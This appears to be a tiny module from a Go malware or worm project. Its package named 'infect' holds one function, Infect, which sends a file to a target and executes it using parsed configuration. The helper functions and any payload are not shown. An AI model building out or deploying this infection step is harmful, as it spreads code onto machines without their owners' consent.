package infect

import(
  "../info"
)

func Infect(i *info.Info){
  sendFileAndExecute(i, parseConfig(i))
}
